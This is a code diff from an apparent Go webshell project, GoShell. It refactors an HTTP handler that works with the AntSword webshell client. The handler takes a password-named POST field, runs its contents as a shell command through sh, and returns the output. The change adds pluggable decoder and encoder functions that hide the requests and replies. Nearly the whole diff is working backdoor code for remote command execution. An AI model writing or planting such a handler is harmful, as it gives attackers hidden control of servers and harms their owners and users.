@@ -1,33 +1,28 @@
-package handler
+package server
 
 import (
 	"net/http"
+	"net/url"
 
 	"github.com/Wd0g/GoShell/lib/common"
 )
 
 type Cmd struct {
 	Pwd     string // 蚁剑连接密码
-	Decoder string // 请求内容解码方式
+	Decoder func(url.Values) url.Values
+	Encoder func(string) string
 }
 
 func (c Cmd) ServeHTTP(w http.ResponseWriter, req *http.Request) {
+	req.ParseForm()
+	req.PostForm = c.Decoder(req.PostForm)
 	// 检测参数
-	var args string
-	switch c.Decoder {
-	case "base64":
-		args = common.Base64Decode(req.PostFormValue(c.Pwd))
-	case "plain":
-		args = req.PostFormValue(c.Pwd)
-	default:
-		args = req.PostFormValue(c.Pwd)
-	}
-
+	args := req.PostFormValue(c.Pwd)
 	if args == "" {
 		return
 	}
 
 	res, _ := common.Shell(args, "sh")
-	w.Write([]byte(res))
+	w.Write([]byte(c.Encoder(res)))
 	return
 }
